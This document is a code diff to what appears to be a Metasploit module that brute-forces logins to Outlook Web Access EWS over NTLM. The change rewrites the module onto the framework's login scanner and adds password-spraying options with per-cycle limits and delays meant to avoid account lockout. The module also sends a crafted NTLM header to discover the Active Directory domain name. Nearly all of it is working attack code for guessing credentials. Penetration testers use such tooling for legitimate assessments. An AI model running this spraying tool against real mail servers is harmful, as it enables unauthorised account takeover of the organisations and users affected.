@@ -4,10 +4,11 @@
 ##
 
 require 'rex/proto/ntlm/message'
-require 'rex/proto/http'
+require 'metasploit/framework/login_scanner/owa_ews'
 require 'metasploit/framework/credential_collection'
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
@@ -32,93 +33,91 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptBool.new('AUTODISCOVER', [ false, "Automatically discover domain URI", true ]),
-        OptString.new('AD_DOMAIN', [ false, "The Active Directory domain name", nil ]),
+        OptString.new('DOMAIN', [ false, "The Active Directory domain name", nil ]),
         OptString.new('TARGETURI', [ false, "The location of the NTLM service", nil ]),
+        OptBool.new('PASSWORD_SPRAY', [ false, "Loop over passwords instead of usernames", true ]),
+        OptInt.new('PASSWORDS_PER_CYCLE', [ false, "Passwords per cycle", nil ]),
+        OptInt.new('CYCLE_DELAY', [ false, "Number of minutes to sleep between cycles", nil ]),
         Opt::RPORT(443)
       ])
   end
 
-  def run_host(ip)
-    cli = Rex::Proto::Http::Client.new(datastore['RHOSTS'], datastore['RPORT'], {}, datastore['SSL'], datastore['SSLVersion'], nil, '', '')
-    cli.set_config({ 'preferred_auth' => 'NTLM' })
-    cli.connect
-
+  def run
     domain = nil
     uri = nil
 
     if datastore['AUTODISCOVER']
-      domain, uri = autodiscover(cli)
+      domain, uri = autodiscover
       if domain && uri
         print_good("Found NTLM service at #{uri} for domain #{domain}.")
       else
         print_error("Failed to autodiscover - try manually")
         return
       end
-    elsif datastore['AD_DOMAIN'] && datastore['TARGETURI']
-      domain = datastore['AD_DOMAIN']
+    elsif datastore['DOMAIN'] && datastore['TARGETURI']
+      domain = datastore['DOMAIN']
       uri = datastore['TARGETURI']
       uri << "/" unless uri.chars.last == "/"
     else
-      print_error("You must set AD_DOMAIN and TARGETURI if not using autodiscover.")
+      print_error("You must set DOMAIN and TARGETURI if not using autodiscover.")
       return
     end
 
-    cli.set_config({ 'domain' => domain })
-
     creds = Metasploit::Framework::CredentialCollection.new(
       blank_passwords: datastore['BLANK_PASSWORDS'],
-      pass_file: datastore['PASS_FILE'],
-      password: datastore['PASSWORD'],
-      user_file: datastore['USER_FILE'],
-      userpass_file: datastore['USERPASS_FILE'],
-      username: datastore['USERNAME'],
-      user_as_pass: datastore['USER_AS_PASS']
+      pass_file:       datastore['PASS_FILE'],
+      password:        datastore['PASSWORD'],
+      user_file:       datastore['USER_FILE'],
+      userpass_file:   datastore['USERPASS_FILE'],
+      username:        datastore['USERNAME'],
+      user_as_pass:    datastore['USER_AS_PASS']
     )
 
-    creds.each do |cred|
-      begin
-        req = cli.request_raw({
-          'uri' => uri,
-          'method' => 'GET',
-          'username' => cred.public,
-          'password' => cred.private
-        })
+    scanner = Metasploit::Framework::LoginScanner::OutlookWebAccessEWS.new(
+      configure_http_login_scanner(
+        uri:                 uri,
+        vhost:               vhost || rhost,
+        cred_details:        creds,
+        stop_on_success:     datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed:    datastore['BRUTEFORCE_SPEED'],
+        http_username:       datastore['HttpUsername'],
+        http_password:       datastore['HttpPassword'],
+        connection_timeout:  10,
+        passwords_per_cycle: datastore['PASSWORDS_PER_CYCLE'] || 0,
+        cycle_delay:         datastore['CYCLE_DELAY'] || 0,
+        password_spray:      datastore['PASSWORD_SPRAY'],
+        ntlm_domain:         domain
+      )
+    )
 
-        res = cli.send_recv(req)
-      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-        print_error("Connection failed")
-        next
-      end
-
-      if res.code != 401
-        print_brute :level => :good, :ip => ip, :msg => "Successful login: #{cred.to_s}"
-        report_cred(
-          ip: ip,
-          port: datastore['RPORT'],
-          service_name: 'owa_ews',
-          user: cred.public,
-          password: cred.private
-        )
-
-        return if datastore['STOP_ON_SUCCESS']
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
+      if result.success?
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+        print_good "#{peer} - Login Successful: #{result.credential}"
       else
-        vprint_brute :level => :verror, :ip => ip, :msg => "Failed login: #{cred.to_s}"
+        invalidate_login(credential_data)
+        vprint_error "#{peer} - Login failed: #{result.credential} (#{result.status})"
       end
     end
   end
 
-  def autodiscover(cli)
+  def autodiscover
     uris = %w[ /ews/ /rpc/ /public/ ]
     uris.each do |uri|
       begin
-        req = cli.request_raw({
+        res = send_request_cgi({
           'encode'   => true,
           'uri'      => uri,
           'method'   => 'GET',
-          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
+          'headers'  => {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
         })
-
-        res = cli.send_recv(req)
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
         print_error("HTTP Connection Failed")
         next
@@ -130,38 +129,12 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
-        hash = res['WWW-Authenticate'].split('NTLM ')[1]
-        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
+        auth_blob = res['WWW-Authenticate'].split('NTLM ')[1]
+        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(auth_blob))[:target_name].value().gsub(/\0/,'')
         return domain, uri
       end
     end
 
     return nil, nil
-  end
-
-  def report_cred(opts)
-    service_data = {
-      address: opts[:ip],
-      port: opts[:port],
-      service_name: opts[:service_name],
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
-
-    login_data = {
-      core: create_credential(credential_data),
-      last_attempted_at: DateTime.now,
-      status: Metasploit::Model::Login::Status::SUCCESSFUL,
-    }.merge(service_data)
-
-    create_credential_login(login_data)
   end
 end
